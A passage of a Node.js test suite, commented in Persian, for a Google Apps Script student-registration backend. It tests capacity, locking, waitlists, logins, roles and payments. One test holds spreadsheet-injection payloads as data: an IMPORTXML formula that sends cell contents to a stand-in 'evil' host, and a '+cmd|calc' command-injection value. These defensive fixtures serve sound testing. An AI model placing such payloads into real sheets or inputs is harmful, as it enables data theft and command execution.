'use strict';
/* آزمایش پشتیبانِ Apps Script (Code.gs) روی شبیه‌ساز Google. پیش‌نیاز: node tools/build.js */
const test = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const path = require('node:path');
const JR = require('../docs/js/shared.js');

execFileSync(process.execPath, [path.join(__dirname, '..', 'tools', 'build.js')], { stdio: 'ignore' });
const { createGas } = require('./gas-mock.js');

const T0 = JR.fromTehran(1405, 8, 8, 20, 0);
const SHEET = { regs: 'ثبت‌نام‌ها', users: 'کاربران', settings: 'تنظیمات', audit: 'گزارش', wl: 'فهرست دانشجویان', exp: 'هزینه‌ها', task: 'چک‌لیست' };

function nid(base9) {
  let sum = 0;
  for (let k = 0; k < 9; k++) sum += +base9[k] * (10 - k);
  const r = sum % 11;
  return base9 + (r < 2 ? r : 11 - r);
}
function person(i, extra) {
  return Object.assign({
    firstName: 'سارا', lastName: 'نمونه', studentId: String(40124000 + i), nationalId: nid(String(100000000 + i * 7919).slice(0, 9)),
    phone: '0912' + String(1000000 + i), degree: 'کارشناسی', major: 'قدرت', accepted: true
  }, extra || {});
}
function rid(i) { return 'rid' + String(i).padStart(8, '0'); }

/** سامانه‌ی تازه + ورود مدیر (با تغییر رمز اجباری) */
function boot(opts) {
  const g = createGas(Object.assign({ now: T0 - 3600000 }, opts || {}));
  g.setup();
  const first = g.adminPassword();
  const lg = g.post('admin/login', { username: 'admin', password: first });
  const NEW = 'Jaryan-Test-2026';
  const ch = g.post('admin/password', { current: first, next: NEW }, lg.token);
  assert.equal(ch.ok, true, JSON.stringify(ch));
  g.admin = lg.token; g.adminPw = NEW; g.firstPw = first;
  g.A = (p, b, q, m) => g.post('admin/' + p, b, g.admin, q, m);
  g.AG = (p, q) => g.post('admin/' + p, null, g.admin, q, 'GET');
  return g;
}
function openAt(g, ms, extra) {
  const r = g.A('settings', Object.assign({ openAtMs: ms }, extra || {}));
  assert.equal(r.ok, true, JSON.stringify(r));
}
function regsSheetRows(g) {
  const sh = g.sheet(SHEET.regs), last = sh.getLastRow();
  return last < 2 ? [] : sh.getRange(2, 1, last - 1, 19).getValues();
}

/* ───────────── راه‌اندازی ───────────── */
test('setup: برگه‌ها، قالب متنی، کاربر مدیر؛ اجرای دوباره چیزی را پاک نمی‌کند', () => {
  const g = createGas();
  const msg = g.setup();
  assert.match(msg, /نام‌کاربری: admin/);
  Object.values(SHEET).forEach((n) => assert.ok(g.sheet(n), 'برگه‌ی ' + n));
  assert.equal(g.sheet('Sheet1'), null, 'برگه‌ی خالی پیش‌فرض برداشته شود');
  const regs = g.sheet(SHEET.regs);
  assert.equal(regs.fmt.get('2,6'), '@', 'شماره دانشجویی متن باشد');
  assert.equal(regs.fmt.get('2,7'), '@', 'کد ملی متن باشد');
  assert.equal(regs.fmt.get('2,8'), '@', 'موبایل متن باشد');
  assert.equal(regs.fmt.get('2,1'), '0', 'ردیف عدد باشد');
  const pw = g.adminPassword();
  assert.match(pw, /^[0-9a-f]{12}$/);
  // رمز به‌صورت متن ساده هیچ‌جای Sheet نیست
  for (const n of Object.values(SHEET)) for (const v of g.sheet(n).cells.values()) assert.ok(!String(v).includes(pw));
  const users = g.sheet(SHEET.users).getRange(2, 1, 1, 10).getValues()[0];
  assert.equal(users[1], 'admin');
  assert.equal(users[3], 'admin');
  assert.match(users[5], /^[0-9a-f]{64}$/);
  assert.ok(g.props.get('PEPPER').length >= 40);
  assert.ok(g.props.get('SHEET_ID'));
  // اجرای دوباره
  const again = g.setup();
  assert.match(again, /قبلاً/);
  assert.equal(g.sheet(SHEET.users).getLastRow(), 2);
  assert.equal(g.post('admin/login', { username: 'admin', password: pw }).ok, true, 'رمز قبلی هنوز کار می‌کند');
  assert.equal(g.ctx.selfCheck().includes('اتصال سالم'), true);
});

test('setup: خارج از Google Sheet خطای روشن می‌دهد', () => {
  const g = createGas({ noActive: true });
  assert.throws(() => g.setup(), /Google Sheet/);
});

/* ───────────── وضعیت عمومی ───────────── */
test('وضعیت: قبل از شروع، لحظه‌ی دقیق شروع، و بدون خواندن Sheet وقتی کش گرم است', () => {
  const g = boot();
  openAt(g, T0);
  let st = g.get('status');
  assert.equal(st.ok, true);
  assert.equal(st.phase, 'before');
  assert.equal(st.capacity, 40);
  assert.equal(st.serverTime, g.now);
  assert.equal(st.openAtMs, T0);
  assert.equal(st.nationalIds, undefined);
  const reads = g.stats.reads;
  for (let i = 0; i < 20; i++) g.get('status');
  assert.equal(g.stats.reads, reads, 'پیمایش وضعیت نباید Sheet را بخواند');
  g.now = T0 - 1; assert.equal(g.get('status').phase, 'before');
  g.now = T0;     assert.equal(g.get('status').phase, 'open', 'فاز با ساعت سرور و بدون انتظار برای انقضای کش عوض می‌شود');
  assert.equal(g.doGet().phase, 'open');
  assert.equal(g.doGet('status').ok, true);
  assert.equal(g.doGet('admin/data').code, 'NOT_FOUND', 'مسیرهای مدیریت از راه GET باز نیستند');
});

test('وضعیت عمومی هیچ داده‌ی شخصی ندارد', () => {
  const g = boot();
  openAt(g, T0, { waitlistEnabled: true });
  g.now = T0;
  g.post('register', Object.assign(person(1), { rid: rid(1) }));
  const txt = JSON.stringify(g.get('status'));
  assert.ok(!txt.includes('40124001'));
  assert.ok(!txt.includes('نمونه'));
});

/* ───────────── ثبت‌نام ───────────── */
test('ثبت‌نام قبل از شروع رد می‌شود (بدون قفل) و ثانیه‌ی شروع پذیرفته می‌شود', () => {
  const g = boot();
  openAt(g, T0);
  g.get('status');
  const acq = g.lock.acquired;
  g.now = T0 - 5000;
  const early = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  assert.equal(early.ok, false);
  assert.equal(early.code, 'NOT_OPEN');
  assert.equal(early._s, 409);
  assert.equal(early.opensInMs, 5000);
  assert.equal(g.lock.acquired, acq, 'رد سریع نباید قفل بگیرد');
  assert.equal(regsSheetRows(g).length, 0);
  g.now = T0;
  const ok = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  assert.equal(ok.ok, true, JSON.stringify(ok));
  assert.equal(ok.status, 'confirmed');
  assert.equal(ok.registration.seq, 1);
  assert.match(ok.registration.code, /^\d{6}$/);
  assert.equal(g.lock.held, false);
});

test('ظرفیت دقیقاً ۴۰: با ۱۰۰ تلاش فقط ۴۰ نفر؛ بعد از نفر چهلم بدون قفل رد می‌شود', () => {
  const g = boot();
  openAt(g, T0);
  let ok = 0, full = 0, acqAt40 = null;
  for (let i = 1; i <= 100; i++) {
    g.now = T0 + i * 10;
    const r = g.post('register', Object.assign(person(i), { rid: rid(i) }));
    if (r.ok) { ok++; assert.equal(r.status, 'confirmed'); assert.equal(r.registration.seq, i); if (ok === 40) acqAt40 = g.lock.acquired; }
    else { full++; assert.equal(r.code, 'FULL'); assert.equal(r._s, 409); assert.ok(ok === 40, 'FULL فقط بعد از نفر چهلم'); }
  }
  assert.equal(ok, 40);
  assert.equal(full, 60);
  assert.equal(g.lock.acquired, acqAt40, '۶۰ درخواستِ بعدی بدون گرفتن قفل رد شده‌اند');
  const rows = regsSheetRows(g);
  assert.equal(rows.length, 40);
  assert.deepEqual(rows.map((r) => r[0]), Array.from({ length: 40 }, (_, k) => k + 1));
  assert.equal(new Set(rows.map((r) => r[5])).size, 40);
  const st = g.get('status');
  assert.equal(st.phase, 'full'); assert.equal(st.taken, 40); assert.equal(st.remaining, 0); assert.ok(st.fullAtMs);
  const data = g.AG('data');
  assert.equal(data.registrations.length, 40);
  assert.equal(data.stats.confirmed, 40);
  assert.equal(g.out.tooLarge, 0, 'هیچ مقداری از سقف ۱۰۰KB کش بزرگ‌تر نشد');
  assert.equal(g.lock.held, false);
  assert.equal(g.lock.acquired, g.lock.released);
});

test('قفل واقعاً نگه داشته می‌شود: درخواست همزمانِ وسط نوشتن، به‌جای تداخل، «شلوغ» می‌گیرد', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  const sh = g.sheet(SHEET.regs);
  const orig = sh.getRange.bind(sh);
  let inner = null, armed = true;
  sh.getRange = (...a) => {
    const rng = orig(...a), sv = rng.setValues.bind(rng);
    rng.setValues = (v) => {
      if (armed && a[0] >= 2) { armed = false; inner = g.post('register', Object.assign(person(2), { rid: rid(2) })); }
      return sv(v);
    };
    return rng;
  };
  const first = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  assert.equal(first.ok, true);
  assert.equal(inner.ok, false);
  assert.equal(inner.code, 'BUSY');
  assert.equal(inner._s, 503);
  assert.equal(regsSheetRows(g).length, 1);
  assert.equal(g.lock.held, false);
});

test('قفل پس از خطای غیرمنتظره آزاد می‌شود و خطا به‌صورت JSON برمی‌گردد', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  const sh = g.sheet(SHEET.regs);
  const orig = sh.getRange.bind(sh);
  sh.getRange = () => { throw new Error('Service error: Spreadsheets'); };
  const r = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  assert.equal(r.ok, false);
  assert.equal(r.code, 'SERVER_ERROR');
  assert.equal(r._s, 500);
  assert.equal(g.lock.held, false);
  sh.getRange = orig;
  assert.equal(g.post('register', Object.assign(person(1), { rid: rid(3) })).ok, true, 'پس از رفع خطا ثبت‌نام ادامه دارد');
});

test('قفل مشغول: پاسخ «شلوغ» و هیچ ثبت‌نامِ ناقصی نوشته نمی‌شود', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  g.lock.busy = true;
  const r = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  assert.equal(r.code, 'BUSY');
  assert.equal(regsSheetRows(g).length, 0);
  g.lock.busy = false;
  assert.equal(g.post('register', Object.assign(person(1), { rid: rid(1), retry: 1 })).ok, true);
});

test('ارسال مجدد با همان rid ثبت‌نام را دو بار نمی‌سازد (از کش و از Sheet)', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  const a = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  assert.equal(a.ok, true);
  const b = g.post('register', Object.assign(person(1), { rid: rid(1), retry: 1 }));
  assert.equal(b.ok, true); assert.equal(b.registration.code, a.registration.code); assert.equal(b.repeated, true);
  g.cacheStore.clear();                                   // کش پاک شود: باید از روی Sheet پیدا شود
  const c = g.post('register', Object.assign(person(1), { rid: rid(1), retry: 1 }));
  assert.equal(c.ok, true); assert.equal(c.registration.code, a.registration.code);
  assert.equal(regsSheetRows(g).length, 1);
  // بدون retry، همان فرد تکراری شناخته می‌شود
  const d = g.post('register', Object.assign(person(1), { rid: rid(9) }));
  assert.equal(d.ok, false); assert.equal(d.code, 'DUPLICATE'); assert.equal(d._s, 409);
});

test('بعد از پر شدن: ارسال مجدد کسی که قبلاً ثبت شده نتیجه‌ی خودش را می‌گیرد، نه «پر است»', () => {
  const g = boot();
  openAt(g, T0, { capacity: 1 });
  g.now = T0;
  const a = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  assert.equal(a.ok, true);
  assert.equal(g.get('status').phase, 'full');
  const stranger = g.post('register', Object.assign(person(2), { rid: rid(2) }));
  assert.equal(stranger.code, 'FULL');
  g.cacheStore.clear();
  const again = g.post('register', Object.assign(person(1), { rid: rid(1), retry: 1 }));
  assert.equal(again.ok, true, JSON.stringify(again));
  assert.equal(again.registration.code, a.registration.code);
});

test('صفر ابتدایی شماره دانشجویی، کد ملی و موبایل در Sheet و پاسخ‌ها حفظ می‌شود', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  const p = person(1, { studentId: '0401240001', nationalId: nid('001354241'), phone: '09121234567' });
  assert.ok(p.nationalId.startsWith('00'));
  const r = g.post('register', Object.assign(p, { rid: rid(1) }));
  assert.equal(r.ok, true, JSON.stringify(r));
  const row = regsSheetRows(g)[0];
  [5, 6, 7].forEach((i) => assert.equal(typeof row[i], 'string'));
  assert.equal(row[5], '0401240001'); assert.equal(row[6], p.nationalId); assert.equal(row[7], '09121234567');
  const reg = g.AG('data').registrations[0];
  assert.equal(reg.studentId, '0401240001'); assert.equal(reg.nationalId, p.nationalId); assert.equal(reg.phone, '09121234567');
  const lk = g.post('lookup', { code: r.registration.code, studentId: '0401240001' });
  assert.equal(lk.ok, true);
  const csv = g.AG('export', { kind: 'security' })._raw;
  assert.ok(csv.includes(p.nationalId));
});

test('ورودی مخرب (فرمول، HTML) هرگز فرمولِ Sheet نمی‌شود', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  const bad = g.post('register', Object.assign(person(1, { firstName: '=HYPERLINK("http://x","y")' }), { rid: rid(1) }));
  assert.equal(bad.ok, false);
  assert.equal(bad.code, 'INVALID');
  const ok = g.post('register', Object.assign(person(2), { rid: rid(2) }));
  const id = g.AG('data').registrations[0].id;
  const evil = '=IMPORTXML("http://evil/"&A1,"//a")';
  assert.equal(g.A('reg/' + id, { action: 'note', note: evil }).ok, true);
  assert.equal(g.A('reg/' + id, { action: 'setPayment', payment: 'paid', ref: '+cmd|calc', amount: 1000 }).ok, true);
  assert.equal(g.sheet(SHEET.regs).formulaCells, 0);
  const row = regsSheetRows(g)[0];
  assert.equal(row[14], evil); assert.equal(row[12], '+cmd|calc');
  assert.equal(g.A('task', { action: 'add', title: '=1+1' }).ok, true);
  assert.equal(g.A('expense', { action: 'add', title: '@SUM(1)', amountToman: 5 }).ok, true);
  for (const n of Object.values(SHEET)) assert.equal(g.sheet(n).formulaCells, 0, n);
  assert.ok(ok.ok);
});

test('تله‌ی ربات، درخواست خراب و بدنه‌ی بزرگ', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  assert.equal(g.post('register', Object.assign(person(1), { website: 'http://spam', rid: rid(1) })).code, 'BAD_REQUEST');
  assert.equal(g.rawPost('{not json').code, 'BAD_REQUEST');
  assert.equal(g.rawPost('').code, 'BAD_REQUEST');
  assert.equal(g.rawPost('x'.repeat(400001)).code, 'TOO_LARGE');
  assert.equal(g.post('nope/nothing').code, 'NOT_FOUND');
  assert.equal(g.post('register', null, '', null, 'GET').code, 'NOT_FOUND');
  assert.equal(regsSheetRows(g).length, 0);
});

test('فهرست دانشجویان: فقط شماره‌های فهرست‌شده ثبت‌نام می‌کنند', () => {
  const g = boot();
  openAt(g, T0, { whitelistEnabled: true });
  assert.equal(g.A('whitelist', { text: '40124001\n40124002 ۴۰۱۲۴۰۰۳' }).count, 3);
  assert.equal(g.AG('whitelist').count, 3);
  g.now = T0;
  const no = g.post('register', Object.assign(person(9), { rid: rid(9) }));
  assert.equal(no.code, 'NOT_ELIGIBLE'); assert.equal(no._s, 409);
  assert.equal(g.post('register', Object.assign(person(1), { rid: rid(1) })).ok, true);
  assert.equal(g.post('register', Object.assign(person(3), { rid: rid(3) })).ok, true, 'ارقام فارسی هم پذیرفته می‌شود');
  assert.equal(g.AG('data').whitelistCount, 3);
});

test('لیست انتظار: بعد از پر شدن، نفرات بعدی در انتظار می‌روند و با لغو ارتقا می‌یابند', () => {
  const g = boot();
  openAt(g, T0, { capacity: 2, waitlistEnabled: true });
  g.now = T0;
  const r = [1, 2, 3, 4].map((i) => g.post('register', Object.assign(person(i), { rid: rid(i) })));
  assert.deepEqual(r.map((x) => x.status), ['confirmed', 'confirmed', 'waitlist', 'waitlist']);
  assert.equal(r[3].registration.position, 2);
  const st = g.get('status');
  assert.equal(st.phase, 'full'); assert.equal(st.waitlist.open, true); assert.equal(st.waitlist.count, 2);
  const d = g.AG('data');
  const first = d.registrations.find((x) => x.seq === 1);
  const c = g.A('reg/' + first.id, { action: 'cancel', reason: 'انصراف' });
  assert.equal(c.ok, true);
  const after = g.AG('data');
  assert.equal(after.stats.confirmed, 2);
  assert.equal(after.registrations.find((x) => x.seq === 3).status, 'confirmed');
  assert.equal(after.registrations.find((x) => x.seq === 1).status, 'cancelled');
  const rows = regsSheetRows(g);
  assert.equal(rows.find((x) => x[0] === 1)[2], 'لغو شده');
});

test('جست‌وجوی پیگیری: درست، نادرست، و محدودیت تلاش', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  const a = g.post('register', Object.assign(person(1), { rid: rid(1) }));
  const ok = g.post('lookup', { code: a.registration.code, studentId: person(1).studentId });
  assert.equal(ok.ok, true); assert.equal(ok.registration.firstName, 'سارا');
  assert.equal(ok.registration.nationalId, undefined, 'کد ملی در پاسخ نیست');
  const bad = g.post('lookup', { code: '000000', studentId: person(1).studentId });
  assert.equal(bad.code, 'NOT_FOUND'); assert.equal(bad._s, 404);
  let limited = null;
  for (let i = 0; i < 20; i++) { const r = g.post('lookup', { code: String(100000 + i), studentId: person(1).studentId }); if (r.code === 'RATE') { limited = i; break; } }
  assert.ok(limited !== null && limited <= 15, 'پس از چند تلاش قفل می‌شود');
  assert.equal(g.post('lookup', { code: a.registration.code, studentId: person(1).studentId }).code, 'RATE', 'حتی کد درست هم موقتاً بسته است');
  g.advance(11 * 60000);
  assert.equal(g.post('lookup', { code: a.registration.code, studentId: person(1).studentId }).ok, true);
});

/* ───────────── ورود و نشست ───────────── */
test('ورود: بدون توکن/توکن جعلی ۴۰۱؛ رمز غلط؛ قفل پس از ۵ تلاش؛ آزادشدن بعد از ۱۵ دقیقه', () => {
  const g = boot();
  assert.equal(g.post('admin/data', null, '', null, 'GET').code, 'AUTH');
  assert.equal(g.post('admin/data', null, 'a'.repeat(64), null, 'GET')._s, 401);
  assert.equal(g.post('admin/data', null, 'short', null, 'GET')._s, 401);
  const w = g.post('admin/login', { username: 'admin', password: 'wrong-pass' });
  assert.equal(w.code, 'BAD_LOGIN'); assert.equal(w._s, 401);
  assert.equal(g.post('admin/login', { username: 'nobody', password: 'x'.repeat(10) }).code, 'BAD_LOGIN');
  assert.ok(g.out.sleeps >= 2, 'کندسازی تلاش ناموفق');
  for (let i = 0; i < 4; i++) g.post('admin/login', { username: 'admin', password: 'wrong-' + i });   // با تلاش اولِ بالا، جمعاً ۵ ناموفق
  const locked = g.post('admin/login', { username: 'admin', password: g.adminPw });
  assert.equal(locked.code, 'LOCKED'); assert.equal(locked._s, 429);
  assert.equal(g.post('admin/login', { username: 'ADMIN ', password: g.adminPw }).code, 'LOCKED', 'حروف بزرگ/فاصله دور نمی‌زند');
  g.advance(16 * 60000);
  const ok = g.post('admin/login', { username: 'admin', password: g.adminPw });
  assert.equal(ok.ok, true);
  assert.equal(ok.user.mustChange, false);
  assert.equal(ok.user.hash, undefined); assert.equal(ok.user.salt, undefined);
  assert.equal(g.post('admin/data', null, ok.token, null, 'GET').ok, true);
});

test('نشست: تمدید با استفاده، انقضا در بیکاری، خروج', () => {
  const g = boot();
  const lg = g.post('admin/login', { username: 'admin', password: g.adminPw });
  for (let i = 0; i < 4; i++) { g.advance(5 * 3600000); assert.equal(g.post('admin/me', null, lg.token, null, 'GET').ok, true, 'ساعت ' + (i + 1) * 5); }
  g.advance(7 * 3600000);
  assert.equal(g.post('admin/me', null, lg.token, null, 'GET')._s, 401);
  const lg2 = g.post('admin/login', { username: 'admin', password: g.adminPw });
  assert.equal(g.post('admin/logout', {}, lg2.token).ok, true);
  assert.equal(g.post('admin/me', null, lg2.token, null, 'GET')._s, 401);
});

test('رمز اولیه‌ی تصادفی: تا تغییر رمز همه‌ی مسیرها بسته است؛ رمز جدید قوی لازم است', () => {
  const g = createGas();
  g.setup();
  const first = g.adminPassword();
  const lg = g.post('admin/login', { username: 'admin', password: first });
  assert.equal(lg.user.mustChange, true);
  assert.equal(g.post('admin/data', null, lg.token, null, 'GET').code, 'MUST_CHANGE');
  assert.equal(g.post('admin/settings', { capacity: 5 }, lg.token).code, 'MUST_CHANGE');
  assert.equal(g.post('admin/me', null, lg.token, null, 'GET').ok, true);
  assert.equal(g.post('admin/password', { current: 'bad', next: 'Abcdefgh1' }, lg.token).code, 'BAD_PASSWORD');
  assert.equal(g.post('admin/password', { current: first, next: 'short' }, lg.token).code, 'WEAK');
  assert.equal(g.post('admin/password', { current: first, next: first }, lg.token).code, 'WEAK');
  const other = g.post('admin/login', { username: 'admin', password: first });
  assert.equal(g.post('admin/password', { current: first, next: 'Abcdefgh1' }, lg.token).ok, true);
  assert.equal(g.post('admin/data', null, lg.token, null, 'GET').ok, true, 'نشستِ فعلی ادامه دارد');
  assert.equal(g.post('admin/me', null, other.token, null, 'GET')._s, 401, 'نشست‌های دیگر بسته شد');
  assert.equal(g.post('admin/login', { username: 'admin', password: first }).code, 'BAD_LOGIN', 'رمز قدیمی کار نمی‌کند');
  assert.equal(g.post('admin/login', { username: 'admin', password: 'Abcdefgh1' }).ok, true);
});

test('ADMIN_PASSWORD در Script Properties: همان رمز استفاده می‌شود', () => {
  const g = createGas();
  g.props.set('ADMIN_PASSWORD', 'My-Own-Pass-77');
  g.setup();
  const lg = g.post('admin/login', { username: 'admin', password: 'My-Own-Pass-77' });
  assert.equal(lg.ok, true);
});

test('بازنشانی رمز مدیر از ویرایشگر (resetAdminPassword)', () => {
  const g = boot();
  const tok = g.admin;
  const msg = g.ctx.resetAdminPassword();
  const pw = msg.match(/رمز جدید:\s+([0-9a-f]{12})/)[1];
  assert.equal(g.post('admin/me', null, tok, null, 'GET')._s, 401, 'نشست‌های قبلی بسته می‌شود');
  assert.equal(g.post('admin/login', { username: 'admin', password: g.adminPw }).code, 'BAD_LOGIN');
  const lg = g.post('admin/login', { username: 'admin', password: pw });
  assert.equal(lg.ok, true); assert.equal(lg.user.mustChange, true);
});

/* ───────────── نقش‌ها ───────────── */
function makeStaff(g, username) {
  const r = g.A('users', { action: 'add', username: username || 'ali.staff', name: 'علی ستاد', password: 'Staff-Pass-1', role: 'staff' });
  assert.equal(r.ok, true, JSON.stringify(r));
  const lg = g.post('admin/login', { username: username || 'ali.staff', password: 'Staff-Pass-1' });
  assert.equal(lg.user.mustChange, true);
  assert.equal(g.post('admin/password', { current: 'Staff-Pass-1', next: 'Staff-Pass-2' }, lg.token).ok, true);
  return lg.token;
}

test('همکار ستاد: بدون کد ملی و مالی؛ فقط حضور/پرداخت/یادداشت و چک‌لیست', () => {
  const g = boot();
  openAt(g, T0, { priceToman: 100000 });
  g.now = T0;
  g.post('register', Object.assign(person(1), { rid: rid(1) }));
  g.A('expense', { action: 'add', title: 'اتوبوس', amountToman: 5000000 });
  const st = makeStaff(g);
  const S = (p, b, q, m) => g.post('admin/' + p, b, st, q, m);
  const d = S('data', null, null, 'GET');
  assert.equal(d.ok, true);
  assert.equal(d.registrations[0].nationalId, '');
  assert.equal(d.stats.finance, null);
  assert.deepEqual(d.expenses, []);
  assert.deepEqual(d.users, []);
  assert.ok(!JSON.stringify(d).includes(person(1).nationalId));
  const id = d.registrations[0].id;
  const c1 = S('reg/' + id, { action: 'checkIn' });
  assert.equal(c1.ok, true); assert.equal(c1.registration.nationalId, '', 'در پاسخ عملیات هم کد ملی نیست');
  assert.equal(S('reg/' + id, { action: 'setPayment', payment: 'paid', amount: 100000 }).ok, true);
  assert.equal(S('reg/' + id, { action: 'note', note: 'پیام' }).ok, true);
  assert.equal(S('task', { action: 'add', title: 'کار ستاد' }).ok, true);
  const forbidden = [
    ['reg/' + id, { action: 'cancel' }], ['reg/' + id, { action: 'update', fields: { firstName: 'علی' } }], ['reg', person(7)],
    ['settings', { capacity: 99 }], ['control', { action: 'forceOpen' }], ['whitelist', { text: '1' }, null, 'GET'],
    ['expense', { action: 'add', title: 'x', amountToman: 1 }], ['reset', { password: 'x', phrase: 'پاک شود' }],
    ['users', { action: 'add', username: 'evil', password: 'abcdefgh' }], ['audit', null, null, 'GET'],
    ['export', null, { kind: 'all' }, 'GET'], ['backup', null, null, 'GET']
  ];
  forbidden.forEach(([p, b, q, m]) => { const r = S(p, b, q, m); assert.equal(r._s, 403, p + ' ' + JSON.stringify(r)); assert.equal(r.code, 'FORBIDDEN'); });
  assert.equal(g.AG('data').settings.capacity, 40);
  assert.equal(g.AG('data').users.length, 2);
});

test('مدیریت کاربران: افزودن، تکراری، حذف، نقش، بازنشانی رمز (و بستن نشست‌ها)', () => {
  const g = boot();
  const st = makeStaff(g, 'sara.s');
  assert.equal(g.A('users', { action: 'add', username: 'SARA.S', password: 'abcdefgh1' }).code, 'DUPLICATE');
  assert.equal(g.A('users', { action: 'add', username: 'a b', password: 'abcdefgh1' }).code, 'INVALID');
  assert.equal(g.A('users', { action: 'add', username: 'newone', password: '123' }).code, 'WEAK');
  const list = g.AG('data').users;
  const staff = list.find((u) => u.username === 'sara.s'), me = list.find((u) => u.username === 'admin');
  assert.equal(g.A('users', { action: 'delete', id: me.id }).code, 'INVALID', 'حذف خود');
  assert.equal(g.A('users', { action: 'setRole', id: me.id, role: 'staff' }).code, 'INVALID', 'کم‌کردن نقش خود');
  assert.equal(g.A('users', { action: 'setRole', id: staff.id, role: 'admin' }).ok, true);
  assert.equal(g.post('admin/reset', {}, st).code !== 'FORBIDDEN', true, 'نقش ارتقا یافت (نشست قبلی، نقش جدید)');
  assert.equal(g.A('users', { action: 'resetPassword', id: staff.id, password: 'Brand-New-9' }).ok, true);
  assert.equal(g.post('admin/me', null, st, null, 'GET')._s, 401, 'پس از بازنشانی رمز، نشست قبلی بسته است');
  const lg = g.post('admin/login', { username: 'sara.s', password: 'Brand-New-9' });
  assert.equal(lg.user.mustChange, true);
  assert.equal(g.A('users', { action: 'delete', id: staff.id }).ok, true);
  assert.equal(g.post('admin/me', null, lg.token, null, 'GET')._s, 401, 'کاربر حذف‌شده توکنش بی‌اثر است');
  assert.equal(g.A('users', { action: 'delete', id: 'nonexistent' }).code, 'NOT_FOUND');
  assert.equal(g.A('users', { action: 'explode', id: me.id }).code, 'INVALID');
});

/* ───────────── مدیریت ───────────── */
test('تنظیمات: اعتبارسنجی، اعمال فوری روی وضعیت عمومی، قفل/بازشدن ظرفیت', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  assert.equal(g.get('status').phase, 'open');
  const bad = g.A('settings', { capacity: 0, priceToman: -5 });
  assert.equal(bad.ok, false); assert.equal(bad._s, 400); assert.ok(bad.errors.capacity);
  assert.equal(g.A('settings', { openAtMs: T0, closeAtMs: T0 - 1 }).ok, false);
  assert.equal(g.A('settings', { mode: 'forceClosed' }).ok, true);
  assert.equal(g.get('status').phase, 'closed', 'کش وضعیت بلافاصله باطل می‌شود');
  assert.equal(g.post('register', Object.assign(person(1), { rid: rid(1) })).code, 'CLOSED');
  assert.equal(g.A('control', { action: 'forceOpen' }).ok, true);
  assert.equal(g.get('status').phase, 'open');
  assert.equal(g.A('settings', { capacity: 2, priceToman: 150000, announcement: 'سلام', payment: { cardNumber: '6037-9911-2233-4455', cardHolder: 'جریان', bankName: 'ملی' } }).ok, true);
  assert.equal(g.get('status').capacity, 2);
  assert.equal(g.get('status').announcement, 'سلام');
  [1, 2].forEach((i) => assert.equal(g.post('register', Object.assign(person(i), { rid: rid(i) })).ok, true));
  assert.equal(g.get('status').phase, 'full');
  assert.equal(g.post('register', Object.assign(person(3), { rid: rid(3) })).code, 'FULL');
  assert.equal(g.A('settings', { capacity: 3 }).ok, true);
  assert.equal(g.get('status').phase, 'open', 'افزایش ظرفیت، ثبت‌نام را دوباره باز می‌کند');
  assert.equal(g.post('register', Object.assign(person(3), { rid: rid(3) })).ok, true);
  assert.equal(g.get('status').phase, 'full');
  const stored = g.AG('data').settings;
  assert.equal(stored.priceToman, 150000); assert.equal(stored.payment.cardNumber, '6037991122334455');
  assert.deepEqual(stored.eventDate, { jy: 1405, jm: 8, jd: 12 });
  assert.ok(Array.isArray(stored.rules) && stored.rules.length > 0);
});

test('زمان پایان ثبت‌نام و حالت‌های دستی', () => {
  const g = boot();
  openAt(g, T0, { closeAtMs: T0 + 600000 });
  g.now = T0 + 599999; assert.equal(g.post('register', Object.assign(person(1), { rid: rid(1) })).ok, true);
  g.now = T0 + 600000;
  assert.equal(g.get('status').phase, 'closed'); assert.equal(g.get('status').closedReason, 'time');
  const r = g.post('register', Object.assign(person(2), { rid: rid(2) }));
  assert.equal(r.code, 'CLOSED');
  assert.match(r.message, /مهلت/);
});

test('افزودن دستی، ویرایش، پرداخت، حضور، بازگردانی، آمار مالی و هزینه‌ها', () => {
  const g = boot();
  openAt(g, T0, { priceToman: 200000 });
  g.now = T0 - 1000;                                       // قبل از شروع: افزودن دستی مجاز است
  const add = g.A('reg', Object.assign(person(1), { paid: true, note: 'ستاد' }));
  assert.equal(add.ok, true, JSON.stringify(add));
  assert.equal(add.registration.payment, 'paid');
  let d = g.AG('data');
  const id = d.registrations[0].id;
  assert.equal(d.stats.finance.received, 200000);
  assert.equal(g.A('reg/' + id, { action: 'update', fields: { lastName: 'احمدی', phone: '09351234567' } }).ok, true);
  assert.equal(g.A('reg/' + id, { action: 'checkIn' }).ok, true);
  assert.equal(regsSheetRows(g)[0][13], 'حاضر');
  assert.equal(g.A('reg/' + id, { action: 'checkIn', value: false }).ok, true);
  assert.equal(regsSheetRows(g)[0][13], '');
  assert.equal(g.A('reg/' + id, { action: 'setPayment', payment: 'unpaid' }).ok, true);
  assert.equal(regsSheetRows(g)[0][11], '');
  assert.equal(g.A('reg/' + id, { action: 'setPayment', payment: 'bogus' }).code, 'INVALID');
  assert.equal(g.A('reg/' + id, { action: 'cancel' }).ok, true);
  assert.equal(g.A('reg/' + id, { action: 'cancel' }).code, 'NO_CHANGE');
  assert.equal(g.A('reg/' + id, { action: 'restore' }).ok, true);
  assert.equal(g.A('reg/0123456789abcdef', { action: 'note', note: 'x' }).code, 'NOT_FOUND');
  assert.equal(g.post('admin/reg/ZZZ', { action: 'note' }, g.admin).code, 'NOT_FOUND');
  d = g.AG('data');
  assert.equal(d.registrations[0].lastName, 'احمدی');
  assert.equal(regsSheetRows(g).length, 1);
  const e = g.A('expense', { action: 'add', title: 'اتوبوس', amountToman: 3000000, note: 'رفت و برگشت' });
  assert.equal(e.ok, true);
